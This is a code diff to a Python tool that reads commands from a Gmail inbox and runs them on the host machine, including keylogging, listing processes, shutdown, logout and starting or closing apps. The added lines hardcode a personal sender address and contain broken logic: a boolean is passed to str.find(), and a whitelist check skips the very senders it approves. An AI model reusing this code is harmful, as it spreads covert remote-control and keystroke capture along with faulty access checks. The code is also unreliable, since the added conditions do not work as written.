@@ -23,9 +23,22 @@ SCOPES = ["https://mail.google.com/"]
 globalMailList = []
 
 
+def isValidMail(myMail):
+    if myMail == "chiemthoica@gmail.com":
+        return True
+    for mail in globalMailList:
+        if mail == myMail:
+            return True
+    return False
+
+
 def handle(myAr, mail, msgId, threadId):
     print("Handling Mail")
     iskeylog = False
+    isAnonymous = False
+    if mail == "chiemthoica@gmail.com":
+        isAnonymous = True
+
     for task in myAr:
         if task.find("[key_logger]") != -1:
             if iskeylog == False:
@@ -38,7 +51,7 @@ def handle(myAr, mail, msgId, threadId):
             service.listRunningApplication()
         if task == "[list_processes]":
             service.listRunningProcess()
-        if task == "[shut_down]":
+        if task == "[shut_down]" and isAnonymous == False:
             curDir = os.getcwd()
             saveDir = os.path.join(curDir, "ServiceOutput")
             id = len(os.listdir(saveDir))
@@ -50,7 +63,7 @@ def handle(myAr, mail, msgId, threadId):
             gmail_send_message_report(mail, msgId, threadId)
             service.shutdown()
             pass
-        if task == "[log_out]":
+        if task == "[log_out]" and isAnonymous == False:
             curDir = os.getcwd()
             saveDir = os.path.join(curDir, "ServiceOutput")
             id = len(os.listdir(saveDir))
@@ -62,10 +75,10 @@ def handle(myAr, mail, msgId, threadId):
             gmail_send_message_report(mail, msgId, threadId)
             service.logout()
             pass
-        if task.find("[start_app]") != -1:
+        if task.find("[start_app]" and isAnonymous == False) != -1:
             appName = task[12:]
             service.openApplication(appName)
-        if task.find("[close_app]") != -1:
+        if task.find("[close_app]" and isAnonymous == False) != -1:
             appName = task[12:]
             service.closeApplication(appName)
     gmail_send_message_report(mail, msgId, threadId)
@@ -476,6 +489,8 @@ def CheckMail(creds):
                             # using RegEx
                             from_data = re.findall(r"<(.*?)>", values["value"])
                             from_mail = from_data[0]
+                        if isValidMail(from_mail):
+                            continue
                         if msg["payload"].get("parts", -1) != -1:
                             for part in msg["payload"]["parts"]:
                                 try:
